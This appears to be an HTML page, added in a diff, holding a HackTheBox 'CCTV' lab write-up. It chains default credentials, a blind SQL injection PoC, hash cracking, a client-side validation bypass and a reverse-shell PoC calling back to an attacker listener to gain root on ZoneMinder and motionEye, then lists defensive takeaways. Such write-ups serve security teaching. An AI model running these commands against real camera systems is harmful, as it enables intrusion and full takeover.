@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>CCTV Writeup // Rahul Sharma</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600&display=swap">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <script src="../assets/js/theme.js"></script>
+</head>
+<body>
+
+<nav>
+  <div class="container nav-inner">
+    <div class="nav-logo"><a href="../index.html" style="color:inherit;">rahul<span>@sec</span>:~$</a></div>
+    <div class="nav-links">
+      <a href="../index.html">home</a>
+      <a href="../writeups.html" class="active">writeups</a>
+      <a href="../blog.html">blog</a>
+      <button id="theme-toggle" class="theme-toggle" type="button">☀</button>
+    </div>
+  </div>
+</nav>
+
+<div class="container">
+  <div class="page-header">
+    <div class="breadcrumb">
+      <a href="../index.html">~</a>
+      <span class="sep">/</span>
+      <a href="../writeups.html">writeups</a>
+      <span class="sep">/</span>
+      cctv
+    </div>
+
+    <div style="display:flex;align-items:center;gap:16px;margin-bottom:16px;margin-top:16px;">
+      <div style="font-size:2.5rem;">🐧</div>
+      <div>
+        <h1 style="margin-bottom:6px;">CCTV</h1>
+        <div style="display:flex;gap:8px;flex-wrap:wrap;">
+          <span class="badge badge-easy">Easy</span>
+          <span class="badge badge-linux">Linux</span>
+          <span class="badge badge-pwned">✓ Pwned</span>
+        </div>
+      </div>
+    </div>
+
+    <table style="width:auto;border-collapse:collapse;font-size:0.85rem;font-family:var(--font-mono);">
+      <tr>
+        <td style="padding:4px 16px 4px 0;color:var(--text-dim);">Date</td>
+        <td style="padding:4px 0;color:var(--text);">2026-05-26</td>
+      </tr>
+      <tr>
+        <td style="padding:4px 16px 4px 0;color:var(--text-dim);">OS</td>
+        <td style="padding:4px 0;color:var(--text);">Linux — Ubuntu 24.04</td>
+      </tr>
+      <tr>
+        <td style="padding:4px 16px 4px 0;color:var(--text-dim);">Stack</td>
+        <td style="padding:4px 0;color:var(--text);">ZoneMinder 1.37.63 + motionEye 0.43.1b4</td>
+      </tr>
+      <tr>
+        <td style="padding:4px 16px 4px 0;color:var(--text-dim);">CVEs</td>
+        <td style="padding:4px 0;color:var(--green);">CVE-2024-51482 &nbsp;·&nbsp; CVE-2025-60787</td>
+      </tr>
+    </table>
+  </div>
+
+  <div class="writeup-body">
+
+    <h2>Summary</h2>
+    <p>CCTV is a surveillance-themed box that chains two camera applications:</p>
+    <ol style="margin-left:20px;margin-bottom:16px;color:var(--text);">
+      <li style="margin-bottom:6px;"><strong>ZoneMinder</strong> 1.37.63 accepts default creds <code>admin:admin</code>; <code>CVE-2024-51482</code> (blind SQLi) dumps user password hashes. <code>mark</code>'s bcrypt hash cracks against rockyou → SSH access.</li>
+      <li style="margin-bottom:6px;"><strong>motionEye</strong> 0.43.1b4 is discovered on an internal port. Its admin password hash is stored in plaintext config (and used verbatim as the password). <code>CVE-2025-60787</code> — a client-side validation bypass leading to command injection — yields a root shell.</li>
+    </ol>
+
+    <h2>Reconnaissance</h2>
+    <pre>nmap 10.129.4.31
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</pre>
+    <p>Port 80 redirects to <code>cctv.htb</code> (vhost routing), so add it to <code>/etc/hosts</code>:</p>
+    <pre>echo '10.129.4.31  cctv.htb' | sudo tee -a /etc/hosts</pre>
+    <p>The site presents a <strong>ZoneMinder</strong> login, version <code>1.37.63</code> visible on the page.</p>
+
+    <h2>ZoneMinder — Default Creds &amp; CVE-2024-51482</h2>
+    <p>Always try defaults first: <code>admin:admin</code> works. The admin panel reveals three users (<code>admin</code>, <code>mark</code>, <code>superadmin</code>). ZoneMinder 1.37.63 is vulnerable to <strong>CVE-2024-51482</strong>, a boolean-based blind SQL injection that extracts data one bit at a time:</p>
+    <pre>python3 CVE-2024-51482.py -i cctv.htb -u admin -p admin --users
+
+[+] Target is vulnerable!
+Row 1: admin       $2y$10$cmytVWFRnt1XfqsItsJRVe...
+Row 2: mark        $2y$10$prZGnazejKcuTv5bKNexXO...
+Row 3: superadmin  $2y$10$t5z8uIT.n9uCd...</pre>
+
+    <h2>Cracking &amp; SSH Access</h2>
+    <p>Bcrypt is slow (hashcat mode 3200), but <code>mark</code>'s password is in rockyou:</p>
+    <pre>hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
+ssh mark@cctv.htb     # uid=1000(mark); no sudo</pre>
+    <p>There's an inaccessible <code>/home/sa_mark</code> — a hint that lateral movement is needed before privesc.</p>
+
+    <h2>Internal Service Enumeration</h2>
+    <pre>ss -tlnp
+LISTEN 127.0.0.1:3306   (MySQL)
+LISTEN 127.0.0.1:8765   (motionEye web UI)  &lt;-- key target
+LISTEN 127.0.0.1:8554   (RTSP)
+LISTEN 0.0.0.0:22 / *:80</pre>
+    <pre>curl -s http://127.0.0.1:8765/ | grep -i motioneye
+# motionEye 0.43.1b4 / Motion 4.7.1 / Ubuntu 24.04</pre>
+
+    <h2>Port Forward &amp; Plaintext Credentials</h2>
+    <pre>ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
+# browse http://127.0.0.1:8765 locally
+
+cat /etc/motioneye/motion.conf
+# @admin_username admin
+# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0</pre>
+    <p>motionEye uses the stored <strong>SHA1 hash itself</strong> as the login password — paste the hex string directly into the form to authenticate as <code>admin</code>.</p>
+
+    <h2>RCE — CVE-2025-60787</h2>
+    <p>motionEye writes user-supplied values into the motion daemon config without sanitisation; on restart, the daemon evaluates shell syntax embedded in fields like the image filename template. The browser-side <code>configUiValid</code> check is the only guard — and it runs in <em>your</em> browser:</p>
+    <pre>// browser console (F12)
+configUiValid = function() { return true; };</pre>
+    <p>The public PoC automates auth, validation bypass, payload injection, and the restart trigger:</p>
+    <pre>nc -lvnp 4444
+python3 CVE-2025-60787.py revshell \
+  --url 'http://127.0.0.1:8765' \
+  --user 'admin' \
+  --password '989c5a8ee87a0e9521ec81a79187d162109282f0' \
+  -i 10.10.14.56 --port 4444</pre>
+
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="dot dot-r"></div><div class="dot dot-y"></div><div class="dot dot-g"></div>
+        <span class="terminal-title">root shell</span>
+      </div>
+      <div class="terminal-body">
+        <div><span class="t-prompt">kali</span>:~$ <span class="t-cmd">nc -lvnp 4444</span></div>
+        <div class="t-out">connect to [10.10.14.56] from cctv.htb ...</div>
+        <div class="t-success"># id</div>
+        <div class="t-success">uid=0(root) gid=0(root) groups=0(root)</div>
+      </div>
+    </div>
+
+    <h2>Flags</h2>
+    <div class="flag-box">
+      <div class="flag-label">User Flag — /home/sa_mark/user.txt</div>
+      <div class="flag-value">HTB{… redacted …}</div>
+    </div>
+    <div class="flag-box">
+      <div class="flag-label">Root Flag — /root/root.txt</div>
+      <div class="flag-value">HTB{… redacted …}</div>
+    </div>
+
+    <h2>Findings Summary</h2>
+    <table>
+      <thead><tr><th>Finding</th><th>Severity</th><th>Impact</th></tr></thead>
+      <tbody>
+        <tr><td>Default ZoneMinder credentials (admin:admin)</td><td><span class="severity-high">High</span></td><td>Authenticated access to the app</td></tr>
+        <tr><td>CVE-2024-51482: blind SQL injection</td><td><span class="severity-critical">Critical</span></td><td>Full DB dump including password hashes</td></tr>
+        <tr><td>Credentials in plaintext config file</td><td><span class="severity-high">High</span></td><td>motionEye admin access</td></tr>
+        <tr><td>CVE-2025-60787: client-side validation bypass → RCE</td><td><span class="severity-critical">Critical</span></td><td>Remote code execution as root</td></tr>
+      </tbody>
+    </table>
+
+    <h2>Defensive Takeaways</h2>
+    <ul style="margin-left:20px;color:var(--text);line-height:2;">
+      <li><strong>Default credentials are still the #1 quick win.</strong> Force a change on first login; never ship factory creds.</li>
+      <li><strong>Client-side validation is UX, not security.</strong> Every check must be re-enforced server-side — anything reaching the server can be arbitrary.</li>
+      <li><strong>Internal services are in scope.</strong> A loopback-only motionEye was the whole path to root; audit <code>ss -tlnp</code>, not just the external footprint.</li>
+      <li><strong>Config files leak secrets.</strong> Don't store credential material in world/group-readable files; use proper secret storage and strong, salted hashing.</li>
+      <li><strong>Version disclosure + CVE lookup</strong> is a reliable attack path — keep components patched and hide versions where you can.</li>
+    </ul>
+
+    <div style="margin-top:48px;padding-top:24px;border-top:1px solid var(--border);">
+      <a href="../writeups.html" class="btn btn-ghost">&larr; Back to Writeups</a>
+    </div>
+
+  </div>
+</div>
+
+<br><br>
+<footer>
+  <div class="container">
+    © 2026 <span>Rahul Sharma</span> &nbsp;·&nbsp; Security Engineer &nbsp;·&nbsp; HackTheBox writeups &amp; defensive security notes
+  </div>
+</footer>
+
+</body>
+</html>
